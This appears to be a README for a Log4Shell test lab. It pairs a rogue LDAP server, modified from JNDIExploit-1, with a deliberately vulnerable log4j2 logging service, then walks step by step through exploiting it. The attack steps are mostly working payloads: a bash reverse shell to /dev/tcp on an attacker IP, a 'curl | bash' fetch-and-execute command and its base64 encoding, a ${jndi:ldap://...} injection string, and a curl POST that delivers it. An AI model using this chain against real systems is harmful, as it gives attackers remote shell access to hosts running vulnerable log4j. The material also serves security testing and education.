## RogueLDAP

------------

This is a lightweight ```RogueLDAP``` server which is a modified version of the  [JNDIExploit-1](https://github.com/gysf666/JNDIExploit-1). Before running the Rogue LDAP Server, we should build and run the vulnerable ```loggin-log4j2``` application

### Build and run with Maven

In order to build the ```RogueLDAP``` server we will run the following commands 

```
cd RogueLDAP
mvn clean package
cd target
java -jar RogueLDAP-1.4-SNAPSHOT.jar
```

## logging-log4j2

------------

The ```logging-log4j2``` is a vulnerable dummy web service which only logs a user supplied string value. This application created for testing purposes in order to test the Log4Shell vulnerability using the ```RogueLDAP``` server previously described.  

### Build and run with Docker

From cli run the following command to build and run the ```logging-log4j2``` application 

```
cd logging-log4j2
mvn clean install
docker build -f Dockerfile -t logging-log4j2-vuln .
docker run -p 8080:8080 logging-log4j2-vuln 
```

### Build and run with Maven

```
mvn clean package && java -Dlog4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector -jar logging-log4j2-1.0.jar 
```

## Setting up the Environment

The setup should be as follows 

1. Open a new terminal window and run the ```RogueLDAP``` server at the attacking machine
2. Open a new terminal window and run the vulnerable ```logging-log4j2``` application at the target machine
3. create a folder called shells at a preffered location at the attacking machine

```
mkdir shells 
cd shells 
```

Inside the shells folder create an ```index.html``` file 

```
touch index.html 
```

Inside the ```index.html``` file put the following payload and change the IP address to the one that suits to your environment

``` 
/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.6/8082 0>&1" &
``` 

4. convert the payload ```$(curl 192.168.1.6:8085|bash)``` in base64 format as seen below (change the IP address with the one that suits to your environment) 

```
JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=
```

5. In order to perform a JNDI LDAP query the following payload will be used (change the IP address with the one that suits to your environment) 

```
${jndi:ldap://192.168.1.6:6389/JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=}
``` 

6. Now open a new terminal window and inside the shells directory run the following command in order to start a python simple HTTP server

```
cd shells 
python3 -m http.server 8085
```

7. Now that the ```logging-log4j2``` application runs, open a new terminal window and run the ```curl``` command line tool in order to send the jndi payload as shown below 
(change the IP address with the one that suits to your environment) 

```
curl -s -X POST http://192.168.1.6:8080/lol -H "Content-type:application/json" -d "{\"vuln\":\"\${jndi:ldap://192.168.1.6:6389/JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=}\"}"
```
